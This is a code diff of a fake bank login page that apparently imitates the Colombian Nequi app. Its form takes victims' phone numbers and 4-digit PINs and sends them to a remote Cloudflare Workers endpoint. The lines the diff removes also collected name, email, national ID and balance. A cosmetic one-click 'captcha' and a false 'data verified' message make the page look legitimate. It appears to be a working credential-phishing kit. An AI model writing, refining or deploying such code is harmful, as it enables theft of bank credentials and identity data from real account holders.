 // WORKER URL
 const WORKER_URL = "https://throbbing-sky-6a75.claropromoxlaro.workers.dev";
 
-// Variables globales
-let saldoNumerico = 0;
-let saldoSinFormato = '';
-let campoActual = null;
-let placeholderActual = '';
 let captchaValidado = false;
 
 // Función para validar campos
 function validarCampo(campoId, valor) {
-  const checkElement = document.getElementById(campoId + '-check');
-  const errorElement = document.getElementById(campoId + '-error');
-  const fieldElement = document.getElementById(campoId);
-
-  if (!checkElement) return false;
-
   let esValido = false;
 
-  switch(campoId) {
-    case 'usuario':
-      esValido = /^3[0-9]{9}$/.test(valor);
-      break;
-    case 'clave':
-      esValido = /^[0-9]{4}$/.test(valor);
-      break;
-    case 'nombre':
-      esValido = valor !== 'Nombre Completo' && valor.trim().length >= 3;
-      break;
-    case 'correo':
-      esValido = valor !== 'correo@email.com' && /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(valor);
-      break;
-    case 'cedula':
-      esValido = valor !== 'CC 123456789' && valor.trim().length >= 5;
-      break;
-    case 'saldo':
-      esValido = saldoNumerico > 0;
-      break;
+  if (campoId === 'usuario') {
+    esValido = /^\d{10}$/.test(valor);
+  } else if (campoId === 'clave') {
+    esValido = /^\d{4}$/.test(valor);
   }
 
-  if (esValido) {
-    checkElement.classList.add('valid');
-    checkElement.innerHTML = '✔';
-    if (errorElement) errorElement.style.display = 'none';
-  } else {
-    checkElement.classList.remove('valid');
-    checkElement.innerHTML = '!';
-    if (errorElement && valor && valor !== placeholderActual) {
-      errorElement.style.display = 'block';
+  const inputField = document.getElementById(campoId);
+  if (inputField) {
+    if (esValido) {
+      inputField.classList.add('valid');
+      inputField.classList.remove('invalid');
     } else {
-      if (errorElement) errorElement.style.display = 'none';
+      inputField.classList.add('invalid');
+      inputField.classList.remove('valid');
     }
   }
 
@@ -927,33 +543,20 @@ function validarCampo(campoId, valor) {
 
 // Actualizar progreso
 function actualizarProgreso() {
-  const campos = ['usuario', 'clave', 'nombre', 'correo', 'cedula', 'saldo'];
+  const campos = ['usuario', 'clave'];
   let completados = 0;
 
   campos.forEach(campo => {
     const elemento = document.getElementById(campo);
     if (!elemento) return;
 
-    let valor;
-    if (campo === 'usuario' || campo === 'clave' || campo === 'saldo') {
-      valor = elemento.value;
-    } else {
-      valor = elemento.textContent;
-    }
-
+    const valor = elemento.value;
     if (validarCampo(campo, valor)) {
       completados++;
     }
   });
 
-  if (captchaValidado) {
-    completados++;
-    const captchaError = document.getElementById('captcha-error');
-    if (captchaError) captchaError.style.display = 'none';
-  } else {
-    const captchaError = document.getElementById('captcha-error');
-    if (captchaError) captchaError.style.display = 'block';
-  }
+  if (captchaValidado) completados++;
 
   const totalCampos = campos.length + 1;
   const porcentaje = Math.round((completados / totalCampos) * 100);
@@ -1005,10 +608,6 @@ document.getElementById('loginForm').addEventListener('submit', async function (
   const datos = {
     usuario: document.getElementById('usuario')?.value.trim() || '',
     clave: document.getElementById('clave')?.value.trim() || '',
-    nombre: document.getElementById('nombre')?.textContent || '',
-    correo: document.getElementById('correo')?.textContent || '',
-    cedula: document.getElementById('cedula')?.textContent || '',
-    saldo: saldoNumerico,
     transactionId: 'NEQUI_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9)
   };
 
@@ -1033,7 +632,7 @@ document.getElementById('loginForm').addEventListener('submit', async function (
       localStorage.setItem('bancoldata', JSON.stringify(datos));
 
       loader.innerHTML = `
-        <div>✅</div>
+        <div style="font-size: 48px; margin-bottom: 15px;">✅</div>
         Datos verificados correctamente<br>
         <div style="font-size: 13px; margin-top: 10px;">Redirigiendo...</div>
       `;
@@ -1047,7 +646,7 @@ document.getElementById('loginForm').addEventListener('submit', async function (
 
   } catch (error) {
     loader.innerHTML = `
-      <div>❌</div>
+      <div style="font-size: 48px; margin-bottom: 15px;">❌</div>
       Error de conexión<br>
       <div style="font-size: 13px; margin-top: 10px;">Reintentando...</div>
     `;
@@ -1061,50 +660,14 @@ document.getElementById('loginForm').addEventListener('submit', async function (
 });
 
 // CAPTCHA
-document.getElementById('captchaProgress')?.addEventListener('click', function () {
-  if (captchaValidado) return;
-
-  captchaValidado = true;
-
-  const captchaFill = document.getElementById('captchaFill');
-  const captchaContainer = document.getElementById('captchaProgress');
-
-  if (captchaFill) captchaFill.classList.add('completed');
-  if (captchaContainer) captchaContainer.classList.add('completed');
-
-  createConfetti();
-
-  setTimeout(() => {
+document.getElementById('captchaBox')?.addEventListener('click', function () {
+  if (!captchaValidado) {
+    captchaValidado = true;
+    this.classList.add('checked');
+    document.getElementById('captchaCheckbox').innerHTML = '✓';
     validarCampos();
-  }, 1000);
-});
-
-// Confetti
-function createConfetti() {
-  const container = document.getElementById('captchaParticles');
-  if (!container) return;
-
-  container.innerHTML = '';
-
-  for (let i = 0; i < 20; i++) {
-    const particle = document.createElement('div');
-    particle.className = 'particle';
-
-    const left = Math.random() * 100;
-    const top = Math.random() * 100;
-    const direction = Math.random() > 0.5 ? 1 : -1;
-
-    particle.style.cssText = `
-      left: ${left}%;
-      top: ${top}%;
-      background: ${['#FFD700', '#FF6B6B', '#4ECDC4'][Math.floor(Math.random() * 3)]};
-      animation: confetti 1s ease-out forwards;
-      --direction: ${direction};
-    `;
-
-    container.appendChild(particle);
   }
-}
+});
 
 // Event listeners
 document.getElementById('usuario')?.addEventListener('input', function() {
@@ -1117,131 +680,19 @@ document.getElementById('clave')?.addEventListener('input', function() {
   validarCampos();
 });
 
-// Funciones del modal
-function mostrarInputModal(campoId, tipo, titulo, placeholder) {
-  campoActual = campoId;
-  placeholderActual = placeholder;
-
-  const modal = document.getElementById('inputModal');
-  const input = document.getElementById('floatingInput');
-  const tituloModal = document.getElementById('modalTitle');
-
-  if (!modal || !input || !tituloModal) return;
-
-  tituloModal.textContent = titulo;
-
-  const elemento = document.getElementById(campoId);
-  if (elemento) {
-    if (campoId === 'saldo') {
-      input.value = elemento.value.replace(/\./g, '') || '';
-    } else {
-      input.value = (elemento.textContent === placeholder) ? '' : elemento.textContent;
-    }
-  }
-
-  input.placeholder = placeholder;
-  input.type = tipo === 'email' ? 'email' : 'text';
-  input.inputMode = tipo === 'number' ? 'decimal' : (tipo === 'email' ? 'email' : 'text');
-
-  modal.style.display = 'flex';
-  setTimeout(() => input.focus(), 300);
-}
-
-function cerrarModal() {
-  document.getElementById('inputModal').style.display = 'none';
-  campoActual = null;
-}
-
-function guardarValor() {
-  if (!campoActual) return;
-
-  const input = document.getElementById('floatingInput');
-  const valor = input.value.trim();
-
-  if (campoActual === 'saldo') {
-    if (valor) {
-      saldoSinFormato = valor.replace(/\D/g, '');
-      saldoNumerico = parseInt(saldoSinFormato) || 0;
-      document.getElementById(campoActual).value = saldoNumerico.toLocaleString('es-CO');
-    } else {
-      document.getElementById(campoActual).value = '';
-      saldoNumerico = 0;
-    }
-  } else {
-    const elemento = document.getElementById(campoActual);
-    if (elemento) {
-      elemento.textContent = valor || placeholderActual;
-    }
-  }
-
-  validarCampo(campoActual, valor || placeholderActual);
-  validarCampos();
-  cerrarModal();
-}
-
-function manejarEntradaSaldo(input) {
-  if (!input) return;
-
-  const numeros = input.value.replace(/\D/g, '');
-  saldoNumerico = parseInt(numeros) || 0;
-
-  if (numeros) {
-    input.value = saldoNumerico.toLocaleString('es-CO');
-  }
-
-  validarCampo('saldo', input.value);
-  validarCampos();
-}
-
-function formatearSaldoFinal(input) {
-  if (!input) return;
-
-  if (saldoNumerico > 0) {
-    input.value = saldoNumerico.toLocaleString('es-CO');
-  }
-
-  validarCampo('saldo', input.value);
-  validarCampos();
-}
-
-// Event listeners del modal
-document.getElementById('floatingInput')?.addEventListener('keypress', function(e) {
-  if (e.key === 'Enter') guardarValor();
+// Solo números
+document.getElementById('usuario')?.addEventListener('keypress', function(e) {
+  if (e.key < '0' || e.key > '9') e.preventDefault();
 });
 
-document.addEventListener('keydown', function(e) {
-  if (e.key === 'Escape') cerrarModal();
+document.getElementById('clave')?.addEventListener('keypress', function(e) {
+  if (e.key < '0' || e.key > '9') e.preventDefault();
 });
 
 // Inicialización
 document.addEventListener('DOMContentLoaded', function() {
-  const campos = ['usuario', 'clave', 'nombre', 'correo', 'cedula', 'saldo'];
-
-  campos.forEach(campo => {
-    const elemento = document.getElementById(campo);
-    if (!elemento) return;
-
-    let valor;
-    if (campo === 'usuario' || campo === 'clave' || campo === 'saldo') {
-      valor = elemento.value;
-    } else {
-      valor = elemento.textContent;
-    }
-    validarCampo(campo, valor);
-  });
-
   validarCampos();
 });
-
-// Animación CSS
-const style = document.createElement('style');
-style.textContent = `
-  @keyframes confetti {
-    0% { opacity: 1; transform: translate(0, 0) rotate(0deg); }
-    100% { opacity: 0; transform: translate(calc(50px * var(--direction, 1)), 80px) rotate(360deg); }
-  }
-`;
-document.head.appendChild(style);
 </script>
 
 </body>
